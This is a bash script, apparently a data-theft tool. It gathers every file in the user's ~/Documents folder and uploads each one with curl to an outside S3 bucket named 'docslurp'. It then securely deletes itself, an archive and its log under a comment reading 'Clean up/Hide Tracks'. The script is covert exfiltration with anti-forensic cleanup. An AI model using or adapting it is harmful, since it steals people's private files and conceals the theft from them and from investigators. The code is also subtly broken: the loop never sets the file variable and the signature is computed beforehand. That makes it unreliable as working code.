#!/bin/bash

key_id="http://link-to-key-file.com/key"
key_secret="http://link-to-secret-key-file.com/secret-key"
path="data/$file"
bucket="docslurp"
content_type="application/octet-stream"
date="$(LC_ALL=C date -u +"%a, %d %b %Y %X %z")"
md5="$(openssl md5 -binary < "$file" | base64)"
distro="$(cat /proc/version)"
sig="$(printf "PUT\n$md5\n$content_type\n$date\n/$bucket/$path" | openssl sha1 -binary -hmac "$key_secret" | base64)"

#Get a list of all files in ~/Documents
find ~/Documents -type f >> /tmp/files

function upload_files {
curl -T $file http://$bucket.s3.amazonaws.com/$path \
    -H "Date: $date" \
    -H "Authorization: AWS $key_id:$sig" \
    -H "Content-Type: $content_type" \
    -H "Content-MD5: $md5"
}

for n in $(cat /tmp/files); do
	
	upload_files $n
done

# Clean up/Hide Tracks
srm -m docs.zip
srm -m uploader.sh
srm -m nohup.out
